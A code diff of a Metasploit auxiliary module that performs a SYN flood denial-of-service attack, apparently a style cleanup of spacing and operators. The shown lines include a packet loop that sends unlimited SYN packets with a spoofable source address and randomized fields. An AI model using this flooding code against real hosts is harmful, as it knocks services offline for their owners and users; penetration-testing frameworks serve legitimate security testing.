@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Capture
   include Msf::Auxiliary::Dos
 
@@ -19,17 +19,17 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      Opt::RPORT(80),
-      OptAddress.new('SHOST', [false, 'The spoofable source address (else randomizes)']),
-      OptInt.new('SPORT', [false, 'The source port (else randomizes)']),
-      OptInt.new('NUM', [false, 'Number of SYNs to send (else unlimited)'])
-    ])
+                       Opt::RPORT(80),
+                       OptAddress.new('SHOST', [false, 'The spoofable source address (else randomizes)']),
+                       OptInt.new('SPORT', [false, 'The source port (else randomizes)']),
+                       OptInt.new('NUM', [false, 'Number of SYNs to send (else unlimited)'])
+                     ])
 
-    deregister_options('FILTER','PCAPFILE')
+    deregister_options('FILTER', 'PCAPFILE')
   end
 
   def sport
-    datastore['SPORT'].to_i.zero? ? rand(65535)+1 : datastore['SPORT'].to_i
+    datastore['SPORT'].to_i.zero? ? rand(65535) + 1 : datastore['SPORT'].to_i
   end
 
   def rport
@@ -54,13 +54,13 @@ class MetasploitModule < Msf::Auxiliary
     p.tcp_dport = rport
     p.tcp_flags.syn = 1
 
-    while (num <= 0) or (sent < num)
-      p.ip_ttl = rand(128)+128
-      p.tcp_win = rand(4096)+1
+    while (num <= 0) || (sent < num)
+      p.ip_ttl = rand(128) + 128
+      p.tcp_win = rand(4096) + 1
       p.tcp_sport = sport
       p.tcp_seq = rand(0x100000000)
       p.recalc
-      break unless capture_sendto(p,rhost)
+      break unless capture_sendto(p, rhost)
       sent += 1
     end
 
